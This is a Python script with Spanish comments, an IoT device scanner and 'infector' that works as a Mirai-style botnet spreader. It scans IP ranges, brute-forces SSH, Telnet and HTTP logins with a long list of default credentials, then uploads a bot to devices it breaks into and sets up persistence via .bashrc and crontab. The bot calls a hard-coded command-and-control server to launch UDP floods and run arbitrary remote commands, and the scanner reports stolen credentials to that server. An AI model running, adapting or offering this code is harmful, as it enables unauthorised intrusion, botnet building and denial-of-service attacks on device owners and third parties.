#!/usr/bin/env python3
# Guardar como: scanner.py
import socket
import threading
import time
import sys
import os
import subprocess
import paramiko
import telnetlib
import json
from queue import Queue
from ipaddress import ip_network

# ===== CONFIGURACIÓN CNC =====
CNC_IP = "172.96.140.62"
CNC_PORT = 1337
# =============================

# Lista ampliada de credenciales IoT
IOT_CREDENTIALS = [
    # Usuario:Contraseña más comunes
    "root:root", "admin:admin", "admin:ADMIN", "root:vizxv",
    "root:pass", "root:anko", "root:1234", "root:", "admin:", 
    "root:xc3511", "root:juantech", "default:", "default:default",
    "supervisor:zyad1234", "root:5up", "default:lJwpbo6",
    "daemon:", "adm:", "root:696969", "root:1234567", 
    "User:admin", "guest:12345", "guest:password", "root:zlxx.",
    "root:1001chin", "root:hunt5759", "admin:true", "admin:changeme",
    "baby:baby", "root:xmhdipc", "root:12341234", "root:ttnet",
    "root:Serv4EMC", "default:S2fGqNFs", "default:OxhlwSG8",
    "toor:root", "root:toor", "vstarcam2015:20150602",
    "root:zsun1188", "admin:meinsm", "admin:adslnadam",
    "root:ipcam_rt5350", "Menara:Menara", "admin:ho4uku6at",
    "root:t0talc0ntr0l4!", "admin:gvt12345", "adminisp:adminisp",
    "root:hi3518", "root:ikwb", "admin:ip3000", "admin:1234",
    "admin:12345", "telnet:telnet", "admin:1234567", "root:system",
    "admin:password", "root:888888", "root:88888888", "root:klv1234",
    "root:Zte521", "root:jvbzd", "root:7ujMko0vizxv",
    "root:7ujMko0admin", "root:dreambox", "root:user",
    "root:realtek", "root:00000000", "admin:1111111", "admin:54321",
    "admin:123456", "default:123456", "default:antslq",
    "default:tlJwpbo6", "root:default", "default:pass",
    "default:12345", "default:password", "root:taZz@23495859",
    "root:20080826", "admin:7ujMko0admin", "root:gforge",
    "admin:synnet", "guest:1111", "root:admin1234", "root:tl789",
    "admin:fliradmin", "root:12345678", "root:123456789",
    "root:1234567890", "root:vertex25ektks123", "root:admin@mymifi",
    "admin:pass", "admin:admin1234", "admin:smcadmin", "root:1111",
    "admin:1111", "root:54321", "root:666666", "root:klv123",
    "Administrator:admin", "service:service", "supervisor:supervisor",
    "admin1:password", "administrator:1234", "666666:666666",
    "888888:888888", "tech:tech", "admin:dvr2580222", "ubnt:ubnt",
    "user:12345", "admin:aquario", "default:lJwpbo6", "ftp:ftp",
    "hikvision:hikvision", "guest:guest", "user:user", "root:abc123",
    "root:xc3511", "root:Serv4EMC", "root:zsun1188", "default:OxhlwSG8",
    "default:S2fGqNFs", "admin:smcadmin", "admin:adslnadam",
    "sysadm:sysadm", "support:support", "root:password", "adm:",
    "bin:", "daemon:", "root:cat1029", "admin:cat1029",
    "mother:fucker", "root:antslq",
]

class Scanner:
    def __init__(self):
        self.found_devices = []
        self.vulnerable_devices = []
        self.scanning = True
        self.lock = threading.Lock()
        self.results_file = "scan_results.json"
        self.cnc_connection = None
        
    def print_banner(self):
        print("\n" + "="*60)
        print("    🔍 IoT DEVICE SCANNER & INFECTOR")
        print(f"    CNC Server: {CNC_IP}:{CNC_PORT}")
        print(f"    Credentials: {len(IOT_CREDENTIALS)} loaded")
        print("="*60 + "\n")
    
    def connect_to_cnc(self):
        """Conectar al CNC para reportar resultados"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((CNC_IP, CNC_PORT))
            sock.send(b"SCANNER|CONNECTED\n")
            self.cnc_connection = sock
            print("[+] Connected to CNC server")
            return True
        except Exception as e:
            print(f"[-] Failed to connect to CNC: {e}")
            return False
    
    def send_to_cnc(self, message):
        """Enviar mensaje al CNC"""
        if self.cnc_connection:
            try:
                self.cnc_connection.send(f"{message}\n".encode())
            except:
                self.cnc_connection = None
    
    def scan_port(self, ip, port, timeout=2):
        """Escaneo rápido de puerto"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_range(self, ip_range, ports=[22, 23, 80, 443, 8080, 8888]):
        """Escanear rango de IPs"""
        print(f"[*] Scanning range: {ip_range}")
        print(f"[*] Ports to check: {ports}")
        
        # Generar lista de IPs
        try:
            network = ip_network(ip_range, strict=False)
            ips = [str(ip) for ip in network.hosts()]
        except:
            ips = [ip_range]  # Si es IP individual
        
        print(f"[*] Total IPs to scan: {len(ips)}")
        
        found = []
        scanned = 0
        
        for ip in ips:
            if not self.scanning:
                break
                
            scanned += 1
            if scanned % 100 == 0:
                print(f"[*] Scanned {scanned}/{len(ips)} IPs...")
            
            open_ports = []
            for port in ports:
                if self.scan_port(ip, port, timeout=1):
                    open_ports.append(port)
            
            if open_ports:
                device_info = {
                    'ip': ip,
                    'ports': open_ports,
                    'timestamp': time.time()
                }
                found.append(device_info)
                
                with self.lock:
                    self.found_devices.append(device_info)
                
                print(f"[+] Found: {ip} - Open ports: {open_ports}")
        
        return found
    
    def check_ssh_vulnerable(self, ip, username, password):
        """Verificar si SSH es vulnerable"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=22, username=username, 
                       password=password, timeout=5, banner_timeout=5)
            
            # Ejecutar comando para verificar
            stdin, stdout, stderr = ssh.exec_command('uname -a', timeout=3)
            output = stdout.read().decode(errors='ignore') if stdout else ""
            
            ssh.close()
            
            return True, output[:100]
        except paramiko.AuthenticationException:
            return False, "Authentication failed"
        except Exception as e:
            return False, str(e)
    
    def check_telnet_vulnerable(self, ip, username, password):
        """Verificar si Telnet es vulnerable"""
        try:
            tn = telnetlib.Telnet(ip, port=23, timeout=5)
            
            # Leer prompt
            time.sleep(0.5)
            tn.read_very_eager()
            
            # Enviar credenciales
            tn.write(username.encode('ascii') + b"\n")
            time.sleep(0.5)
            tn.write(password.encode('ascii') + b"\n")
            time.sleep(1)
            
            # Leer respuesta
            response = tn.read_very_eager().decode('ascii', errors='ignore')
            
            if "login incorrect" in response.lower() or "fail" in response.lower():
                tn.close()
                return False, "Login failed"
            
            # Intentar comando
            tn.write(b"help\n")
            time.sleep(1)
            output = tn.read_very_eager().decode('ascii', errors='ignore')
            
            tn.close()
            return True, output[:100]
            
        except Exception as e:
            return False, str(e)
    
    def check_http_vulnerable(self, ip, username, password, port=80):
        """Verificar login HTTP básico"""
        try:
            import base64
            import urllib.request
            
            auth_string = f"{username}:{password}"
            encoded_auth = base64.b64encode(auth_string.encode()).decode()
            
            headers = {
                'Authorization': f'Basic {encoded_auth}',
                'User-Agent': 'Mozilla/5.0'
            }
            
            url = f"http://{ip}:{port}/"
            req = urllib.request.Request(url, headers=headers)
            
            with urllib.request.urlopen(req, timeout=5) as response:
                if response.status == 200:
                    return True, "HTTP login successful"
            
            return False, "HTTP login failed"
        except:
            return False, "HTTP connection error"
    
    def infect_device(self, ip, service, username, password):
        """Intentar infectar dispositivo con bot"""
        try:
            bot_script = self.generate_bot_script()
            
            if service == "ssh":
                return self.infect_via_ssh(ip, username, password, bot_script)
            elif service == "telnet":
                return self.infect_via_telnet(ip, username, password, bot_script)
            else:
                return False, f"Unsupported service: {service}"
                
        except Exception as e:
            return False, f"Infection error: {e}"
    
    def generate_bot_script(self):
        """Generar script del bot para infección"""
        bot_code = f'''#!/usr/bin/env python3
import socket, platform, time, subprocess, os, sys, threading, random

CNC_IP = "{CNC_IP}"
CNC_PORT = {CNC_PORT}
BOT_ID = f"infected-{{random.randint(1000,9999)}}"

class Bot:
    def __init__(self):
        self.running = True
    
    def connect_cnc(self):
        while self.running:
            try:
                s = socket.socket()
                s.connect((CNC_IP, CNC_PORT))
                s.send(f"BOT|{{BOT_ID}}|{{platform.system()}}\\n".encode())
                return s
            except:
                time.sleep(10)
    
    def udp_attack(self, target_ip, target_port, duration):
        try:
            end = time.time() + duration
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packets = 0
            while time.time() < end and self.running:
                sock.sendto(random._urandom(1024), (target_ip, target_port))
                packets += 1
            sock.close()
            return packets
        except:
            return 0
    
    def start(self):
        while self.running:
            try:
                conn = self.connect_cnc()
                while self.running:
                    try:
                        cmd = conn.recv(4096).decode().strip()
                        if cmd == "PING":
                            conn.send(b"PONG\\n")
                        elif cmd.startswith("UDP"):
                            parts = cmd.split()
                            if len(parts) == 4:
                                ip, port, time_ = parts[1], int(parts[2]), int(parts[3])
                                thread = threading.Thread(target=self.udp_attack, args=(ip, port, time_))
                                thread.daemon = True
                                thread.start()
                                conn.send(b"Attack started\\n")
                        elif cmd == "STOP":
                            self.running = False
                            break
                        else:
                            try:
                                import subprocess
                                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                                output = result.stdout + result.stderr
                                conn.send(output.encode() + b"\\n")
                            except Exception as e:
                                conn.send(f"Error: {{e}}\\n".encode())
                    except:
                        break
                conn.close()
            except:
                time.sleep(5)

if __name__ == "__main__":
    bot = Bot()
    bot.start()
'''
        
        return bot_code
    
    def infect_via_ssh(self, ip, username, password, bot_script):
        """Infectar via SSH"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=22, username=username, 
                       password=password, timeout=10)
            
            # Subir bot
            sftp = ssh.open_sftp()
            
            # Escribir script en /tmp
            with sftp.open('/tmp/bot.py', 'w') as f:
                f.write(bot_script)
            
            # Hacer ejecutable
            ssh.exec_command('chmod +x /tmp/bot.py')
            
            # Ejecutar en background
            ssh.exec_command('cd /tmp && nohup python3 bot.py > /dev/null 2>&1 &')
            
            # Configurar persistencia
            ssh.exec_command('echo "cd /tmp && python3 bot.py &" >> ~/.bashrc')
            ssh.exec_command('(crontab -l 2>/dev/null; echo "@reboot cd /tmp && python3 bot.py") | crontab -')
            
            sftp.close()
            ssh.close()
            
            return True, f"Infected via SSH - Bot deployed"
            
        except Exception as e:
            return False, f"SSH infection failed: {e}"
    
    def infect_via_telnet(self, ip, username, password, bot_script):
        """Infectar via Telnet (limitado)"""
        try:
            tn = telnetlib.Telnet(ip, port=23, timeout=10)
            
            time.sleep(1)
            tn.read_very_eager()
            
            # Login
            tn.write(username.encode() + b"\n")
            time.sleep(0.5)
            tn.write(password.encode() + b"\n")
            time.sleep(1)
            
            # Crear script usando echo
            lines = bot_script.split('\n')
            tn.write(b"cd /tmp\n")
            
            for line in lines:
                if line.strip():
                    tn.write(f'echo "{line}" >> bot.py\n'.encode())
                    time.sleep(0.1)
            
            tn.write(b"chmod +x bot.py\n")
            tn.write(b"python3 bot.py &\n")
            
            tn.close()
            return True, "Telnet infection attempted"
            
        except Exception as e:
            return False, f"Telnet infection failed: {e}"
    
    def brute_force_device(self, device_info):
        """Brute force a dispositivo encontrado"""
        ip = device_info['ip']
        ports = device_info['ports']
        
        print(f"[*] Brute forcing {ip} on ports {ports}")
        
        for port in ports:
            if not self.scanning:
                break
            
            for credential in IOT_CREDENTIALS:
                if ':' not in credential:
                    continue
                    
                username, password = credential.split(':', 1)
                
                if port == 22:  # SSH
                    success, message = self.check_ssh_vulnerable(ip, username, password)
                elif port == 23:  # Telnet
                    success, message = self.check_telnet_vulnerable(ip, username, password)
                elif port in [80, 443, 8080, 8888]:  # HTTP
                    success, message = self.check_http_vulnerable(ip, username, password, port)
                else:
                    continue
                
                if success:
                    print(f"[VULN] {ip}:{port} - {username}:{password}")
                    
                    vulnerable_info = {
                        'ip': ip,
                        'port': port,
                        'service': 'ssh' if port == 22 else 'telnet' if port == 23 else 'http',
                        'username': username,
                        'password': password,
                        'message': message,
                        'timestamp': time.time()
                    }
                    
                    with self.lock:
                        self.vulnerable_devices.append(vulnerable_info)
                    
                    # Intentar infectar
                    if port in [22, 23]:
                        service = 'ssh' if port == 22 else 'telnet'
                        infect_success, infect_msg = self.infect_device(ip, service, username, password)
                        
                        if infect_success:
                            print(f"[INFECTED] Successfully infected {ip}")
                            vulnerable_info['infected'] = True
                            vulnerable_info['infection_msg'] = infect_msg
                            
                            # Reportar al CNC
                            report = f"NEW_BOT|{ip}|{service}|{username}:{password}"
                            self.send_to_cnc(report)
                        else:
                            vulnerable_info['infected'] = False
                            vulnerable_info['infection_msg'] = infect_msg
                    
                    return True
        
        return False
    
    def start_scan(self, target, ports=[22, 23, 80, 443, 8080, 8888], max_threads=50):
        """Iniciar escaneo completo"""
        self.print_banner()
        
        # Conectar al CNC
        self.connect_to_cnc()
        
        print(f"[*] Starting scan of: {target}")
        print(f"[*] Max threads: {max_threads}")
        
        # Escanear red
        devices = self.scan_range(target, ports)
        
        print(f"\n[*] Found {len(devices)} devices with open ports")
        
        if not devices:
            print("[-] No devices found")
            return
        
        # Brute force en paralelo
        queue = Queue()
        for device in devices:
            queue.put(device)
        
        threads = []
        for i in range(min(max_threads, len(devices))):
            thread = threading.Thread(target=self.worker, args=(queue,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Mostrar progreso
        try:
            while not queue.empty() and self.scanning:
                remaining = queue.qsize()
                total = len(devices)
                processed = total - remaining
                
                print(f"[*] Progress: {processed}/{total} | Vulnerable: {len(self.vulnerable_devices)}", end='\r')
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Scan interrupted")
            self.scanning = False
        
        # Esperar threads
        for thread in threads:
            thread.join(timeout=1)
        
        # Mostrar resultados
        self.show_results()
        
        # Guardar resultados
        self.save_results()
    
    def worker(self, queue):
        """Worker para procesar dispositivos"""
        while not queue.empty() and self.scanning:
            try:
                device = queue.get_nowait()
                self.brute_force_device(device)
                queue.task_done()
            except:
                break
    
    def show_results(self):
        """Mostrar resultados del escaneo"""
        print("\n" + "="*60)
        print("    📊 SCAN RESULTS")
        print("="*60)
        
        if not self.vulnerable_devices:
            print("[!] No vulnerable devices found")
            return
        
        print(f"[+] Found {len(self.vulnerable_devices)} vulnerable devices:\n")
        
        for i, device in enumerate(self.vulnerable_devices, 1):
            print(f"[{i}] {device['ip']}:{device['port']}")
            print(f"    Service: {device['service'].upper()}")
            print(f"    Credentials: {device['username']}:{device['password']}")
            
            if device.get('infected'):
                print(f"    Status: ✅ INFECTED")
                if device.get('infection_msg'):
                    print(f"    Message: {device['infection_msg']}")
            else:
                print(f"    Status: ❌ Not infected")
            
            if device.get('message'):
                print(f"    Info: {device['message']}")
            print()
    
    def save_results(self):
        """Guardar resultados en archivo"""
        if not self.vulnerable_devices:
            return
        
        data = {
            'scan_time': time.time(),
            'cnc_server': f"{CNC_IP}:{CNC_PORT}",
            'vulnerable_devices': self.vulnerable_devices,
            'total_found': len(self.vulnerable_devices)
        }
        
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"scan_results_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"[+] Results saved to: {filename}")
        
        # También guardar en formato texto
        txt_filename = f"scan_results_{timestamp}.txt"
        with open(txt_filename, 'w') as f:
            f.write("="*60 + "\n")
            f.write("VULNERABLE DEVICES FOUND\n")
            f.write("="*60 + "\n\n")
            
            for device in self.vulnerable_devices:
                f.write(f"IP: {device['ip']}:{device['port']}\n")
                f.write(f"Service: {device['service']}\n")
                f.write(f"Credentials: {device['username']}:{device['password']}\n")
                f.write(f"Infected: {'YES' if device.get('infected') else 'NO'}\n")
                if device.get('message'):
                    f.write(f"Info: {device['message']}\n")
                f.write("-"*40 + "\n")
        
        print(f"[+] Text report saved to: {txt_filename}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='IoT Device Scanner & Infector')
    parser.add_argument('target', help='Target IP or CIDR (e.g., 192.168.1.0/24 or 192.168.1.1)')
    parser.add_argument('-p', '--ports', default='22,23,80,443,8080,8888',
                       help='Ports to scan (comma separated)')
    parser.add_argument('-t', '--threads', type=int, default=50,
                       help='Max threads for brute force')
    parser.add_argument('--no-infect', action='store_true',
                       help='Don\'t attempt to infect found devices')
    
    args = parser.parse_args()
    
    # Parse ports
    ports = [int(p.strip()) for p in args.ports.split(',')]
    
    scanner = Scanner()
    
    try:
        scanner.start_scan(args.target, ports, args.threads)
    except KeyboardInterrupt:
        print("\n[*] Scanner stopped by user")
        scanner.scanning = False
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
